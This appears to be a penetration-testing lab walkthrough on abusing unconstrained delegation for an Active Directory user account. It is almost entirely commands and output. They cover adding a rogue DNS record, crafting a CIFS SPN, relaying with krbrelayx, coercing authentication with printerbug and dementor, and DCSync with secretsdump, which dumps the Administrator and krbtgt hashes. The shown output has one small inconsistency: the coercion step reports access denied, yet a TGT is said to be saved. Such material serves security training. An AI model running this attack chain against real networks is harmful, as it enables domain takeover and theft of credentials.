# Unconstrained Delegation - Users

Users in Active Directory can also be configured for unconstrained delegation, and it's quite different to exploit. To get a list of user accounts with this flag set, we can use the PowerView function [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) with a specific LDAP filter that will look for users with the `TRUSTED_FOR_DELEGATION` flag set in their UAC.

{% code overflow="wrap" %}
```bash
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

logoncount            : 0
badpasswordtime       : 12/31/1600 7:00:00 PM
distinguishedname     : CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
objectclass           : {top, person, organizationalPerson, user}
name                  : sqldev
objectsid             : S-1-5-21-2974783224-3764228556-2640795941-1110
samaccountname        : sqldev
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : 12/31/1600 7:00:00 PM
countrycode           : 0
whenchanged           : 8/4/2020 4:49:56 AM
instancetype          : 4
objectguid            : f71224a5-baa7-4aec-bfe9-56778184dc63
lastlogon             : 12/31/1600 7:00:00 PM
lastlogoff            : 12/31/1600 7:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata : {7/30/2020 3:09:16 AM, 7/30/2020 3:09:16 AM, 7/28/2020 1:45:00 AM, 7/28/2020 1:34:13 AM...}
serviceprincipalname  : MSSQL_svc_dev/inlanefreight.local:1443
memberof              : CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
whencreated           : 7/27/2020 6:46:20 PM
badpwdcount           : 0
cn                    : sqldev
useraccountcontrol    : NORMAL_ACCOUNT, TRUSTED_FOR_DELEGATION
usncreated            : 14648
primarygroupid        : 513
pwdlastset            : 7/27/2020 2:46:20 PM
usnchanged            : 90194
```
{% endcode %}

If we somehow managed to compromise this account (i.e., `sqldev`), we also need to be able to update its SPN list, so we need an account with `GenericWrite` privileges on the compromised account.

\
This attack aims to create a DNS record that will point to our attack machine. This DNS record will be a fake computer in the Active Directory environment. Once this DNS record is registered, we will add the SPN `CIFS/our_dns_record` to the account we compromised, which is in an unconstrained delegation. So, if a victim tries to connect via SMB to our fake machine, it will ship a copy of its TGT in its TGS ticket since it will ask for a ticket for `CIFS/our_registration_dns`. This TGS ticket will be sent to the IP address we chose when registering the DNS record, i.e., our attack machine. All we have to do then is extract the TGT and use it.



First, we'll use `dnstool.py` to add a fake DNS record `roguecomputer.inlanefreight.local` pointing to our attack host `10.10.14.2` using any valid domain account.

### Create a Fake DNS Record

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
WhiteBeardx9999@htb[/htb]$ python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207    

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
{% endcode %}

We can verify if the DNS record has been created using `nslookup`.

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local

Server:     dc01.inlanefreight.local
Address:    10.129.1.207#53

Name:   roguecomputer.inlanefreight.local
Address: 10.10.14.2
```
{% endcode %}

Then we add a crafted SPN to our target account using `addspn.py`. The SPN must be `CIFS/dns_entry`, so in our case, we use the option `-s` followed by `CIFS/roguecomputer.inlanefreight.local`. `CIFS` stands for Common Internet File System, equivalent to SMB. The option `--target-type samname` specifies that the target is a username, if unspecified, `krbrelayx` will assume it's a hostname.

**Craft SPN on the Target User (sqldev)**

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local dc01.inlanefreight.local 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```
{% endcode %}

**Using Krbrelayx**&#x20;

Hashes of user sqldev

{% code overflow="wrap" %}
```bash
## To generate hashes
iconv -f ASCII -t UTF-16LE <(printf "C@lluMDIXON") | openssl dgst -md4
```
{% endcode %}

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in export mode (all tickets will be saved to disk)
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
```
{% endcode %}

If we receive an error while trying to execute `krbrelayx.py`, we need to remove or update the impacket installation. The following steps are to remove impacket and reinstall it from the source:

**Removing and Installing Impacket from source**

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ sudo apt remove python3-impacket
...SNIP...
WhiteBeardx9999@htb[/htb]$ sudo apt remove impacket-scripts
...SNIP...
WhiteBeardx9999@htb[/htb]$ git clone -q https://github.com/fortra/impacket;cd impacket
WhiteBeardx9999@htb[/htb]$ sudo python3 -m pip install .
...SNIP...
```
{% endcode %}

**Leveraging the Printer Bug with printerbug.py**

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local

[*] Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[*] Attempting to trigger authentication via rprn RPC at 10.129.205.35
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```
{% endcode %}

Alternatively we can use `dementor.py`, instead of `printerbug.py`:

**Leveraging the Printer Bug with dementor.py**

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local

[*] connecting to dc01.inlanefreight.local
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] done!
```
{% endcode %}

This TGT has been saved to disk in the following file `DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache`.

Finally, we can use `impacket` to use this ticket by exporting its path in the `KRB5CCNAME` environment variable and then using `secretsdump.py` to perform a `DCSync` attack.

**Using Impacket with Kerberos Authentication for the DCSync attack**

{% code overflow="wrap" %}
```bash
WhiteBeardx9999@htb[/htb]$ export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
WhiteBeardx9999@htb[/htb]$ secretsdump.py -k -no-pass dc01.inlanefreight.local

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
INLANEFREIGHT.LOCAL\Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:810d754e118439bab1e1d13216150299:::
```
{% endcode %}
